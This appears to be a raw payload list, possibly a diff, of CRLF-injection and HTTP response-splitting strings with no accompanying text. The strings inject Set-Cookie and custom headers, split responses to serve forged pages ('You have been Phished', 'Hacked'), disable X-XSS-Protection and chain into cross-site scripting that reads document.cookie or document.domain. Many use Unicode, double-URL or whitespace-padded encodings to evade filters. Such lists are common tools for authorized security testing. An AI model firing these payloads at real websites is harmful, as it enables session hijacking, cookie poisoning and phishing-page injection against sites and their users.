+en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fcrowdshield.com%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0D%0ASet-Cookie:mycookie="><img src=x onerror=alert(1)>
+%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BC"><svg onload=alert(1)><%E5%BE%BE
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BC<img src=1 onerror=alert(1)>%E5%98%BE
+%0D%0Avirus:%20"><img src=x onerror=alert(1)>
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0ajavascript:alert(1337);
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a"><svg onload=alert(1)>
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(6)</script>
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img/src/onerror=alert(\ibro`)>`
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0ad1bvs</script><script>alert(\XSS`)</script>c579g`
+%25E5%2598%258D%25E5%2598%258ASet-Cookie:whoami=thecyberneh%25E5%2598%258D%25E5%2598%258A%25E5%2598%258D%25E5%2598%258D%25E5%2598%25BCscript%25E5%2598%25BEalert(1);%25E5%2598%25BC/script%25E5%2598%25BE
+%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
+%0d%0aContent-Type:+text/html%0a%0a<img src=c onerror=alert("XSS")><!--
+%0aContent-Type:%0aX-Content-Type-Options:%20undefined%0aX-XSS-Protection:<script>alert(6)</script>
+%0ASet-Cookie:"><img src=x onerror=alert(1)>
+%0D%0ASet-Cookie:"><img src=x onerror=alert(1)>
+%0d%0aSet-Cookie:CRLFInjection="><img src=x onerror=alert(1)>
+%0aSet-Cookie:crlf=crifinjection%0A%0A<script>alert(6)</script>
+%0d%0aSet-Cookie: crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%0dSet-Cookie:crlf=crifinjection%0A%0A<script>alert(6)</script>
+%23%0aSet-Cookie: crlf=crifinjection%0A%0A<script>alert(6)</script>
+%23%0d%0aSet-Cookie: crlf=crifinjection%0A%0A<script>alert(6)</script>
+%3f%0d%0aSet-Cookie:crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%3f0dSet-Cookie:crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%u000aSet-Cookie:crlf=<script>alert(6)</script>
+%0aSet-Cookie:crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%0d%0aSet-Cookie:crlf=<script>alert(6)</script>
+%0dSet-Cookie:crlf=<script>alert(6)</script>
+%23%0aSet-Cookie: crlf=<script>alert(6)</script>
+%23%0d%0aSet-Cookie: crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%23%0dSet-Cookie: crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%25%30%61Set-Cookie: crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%2e%2e%2f%0d%0aSet-Cookie:crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%2f%2e%2e%0d%0aSet-Cookie: crlf=crifinjection%0A%0A<img src=x onerror=alert(9)>
+%0ASet-Cookie:“><img src=x onerror=prompt(“XSS”)>
+%0d%0ax:sss%0d%0a%0d%0a%0d%0a<img%20src=1%20onerror=(alert)(document.cookie)>
+%0d%0aSet-Cookie:%20attacker=<script>alert(6)</script>
+0%%0a0aSet-Cookie:crlf=<script>alert(6)</script>
+%0aSet-Cookie:crlf=<script>alert(6)</script>
+%23%0aSet-Cookie:crlf=<script>alert(6)</script>
+%23%0d%0aSet-Cookie:crlf=<script>alert(6)</script>
+%23%0dSet-Cookie:crlf=<script>alert(6)</script>
+%25%30%61Set-Cookie:crlf=<script>alert(6)</script>
+%25%30aSet-Cookie:crlf=<script>alert(6)</script>
+%250aSet-Cookie:crlf=<script>alert(6)</script>
+%2f%2e%2e%0d%0aSet-Cookie:crlf=<script>alert(6)</script>
+%3f%0dSet-Cookie:crlf=<script>alert(6)</script>
+%0AHeader-Test: <script>alert(6)</script>
+%0A%20Header-Test:<script>alert(6)</script>
+%20%0AHeader-Test:<script>alert(6)</script>
+%E5%98%8A%E5%98%8DHeader-Test:<script>alert(6)</script>
+%E5%98%8A%E5%98%8D%0AHeader-Test:<script>alert(6)</script>
+crlf%0AHeader-Test:<script>alert(6)</script>
+crlf%0A%20Header-Test:<script>alert(6)</script>
+crlf%20%0AHeader-Test:<script>alert(6)</script>
+crlf%E5%98%8A%E5%98%8DHeader-Test:<script>alert(6)</script>
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:<script>alert(6)</script>
+%0DHeader-Test:<script>alert(6)</script>
+%E5%98%8A%E5%98%8DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%E5%98%8A%E5%98%8D%0DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%3F%0DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%0DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%0D%20Header-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%20%0DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%23%0DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%23%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%E5%98%8A%E5%98%8DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%3F%0DHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%0D%0A%20Header-Test:"><img src=x onerror=prompt(document.domain);>
+%20%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%23%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+\r\nHeader-Test:"><img src=x onerror=prompt(document.domain);>
+\r\n Header-Test:"><img src=x onerror=prompt(document.domain);>
+%5cr%5cnHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%E5%98%8A%E5%98%8D%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%3F%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%0D%0A%20Header-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%20%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%23%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%3F%0D%0AHeader-Test:"><img src=x onerror=prompt(document.domain);>
+%0D%0A%09Header-Test:"><img src=x onerror=prompt(document.domain);>
+crlf%0D%0A%09Header-Test:"><img src=x onerror=prompt(document.domain);>
+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Set-Coookie%3A"><img src=x onerror=alert(1)>
+foobar%20%0dContent-Length%3A%200%20%0dHTTP%2F1.1%20200%20OK%20%0dContent-Type%3A%20text%2Fhtml%20%0dLast-Modified%3A%20Mon%2C%2027%20Oct%202016%2014%3A50%3A18%20GMT%20%0dContent-Length%3A%2045%20%0dHacked%0d
+foobar%20%0d%0aContent-Length%3A%200%20%0d%0aHTTP%2F1.1%20200%20OK%20%0d%0aContent-Type%3A%20text%2Fhtml%20%0d%0aLast-Modified%3A%20Mon%2C%2027%20Oct%202016%2014%3A50%3A18%20GMT%20%0d%0aContent-Length%3A%2045%20%0d%0aHacked%0d%0a
+foobar%0dCONTENT-LENGTH:%200%0d%0dHTTP/1.1%20200%20OK%0dContent-Type:%20text/html%0dCONTENT-LENGTH:%2025%0d%0d<html>Hacked</html>
+foobar%0d%0aCONTENT-LENGTH:%200%0d%0d%0a%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aCONTENT-LENGTH:%2025%0d%0d%0a%0a<html>Hacked</html>
+en%250AContent-Length%253A%25200%250A%250AHTTP%252F1.1%2520200%2520OK%250AContent-Type%253A%2520text%252Fhtml%250AContent-Length%253A%252048%250A%253Chtml%253E%253Cscript%253Edocument.cookie%28%29%253B%253C%252Fscript%253E%253C%252Fhtml%253E
+en%0d%0aContent-Length%3A%200%0d%0d%0a%0aHTTP%2F1.1%20200%20OK%0d%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0d%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0d%0aContent-Length%3A%2040%0d%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aLast-Modified%3A%20Fri%2C%2006%20Mar%202017%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aContent-Length%3A%2048%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
+crlf%E5%98%8A%E5%98%8DHeader-Test:"><img src=x onerror=alert(1)>
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:"><img src=x onerror=alert(1)>
+crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:"><img src=x onerror=alert(1)>
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:"><img src=x onerror=alert(1)>
+crlf%3F%0DHeader-Test:"><img src=x onerror=alert(1)>
+crlf%3F%0D%0AHeader-Test:"><img src=x onerror=alert(1)>
+%E5%98%8D%E5%98%8A%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0A%0d%0A%3Cscript%3Ealert(1)%3C/script%3E%0d%0aSet-Cookie:%20malicious=1%3b%20Path=/;%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0A%3Cscript%3Ealert(1)%3C/script%3E
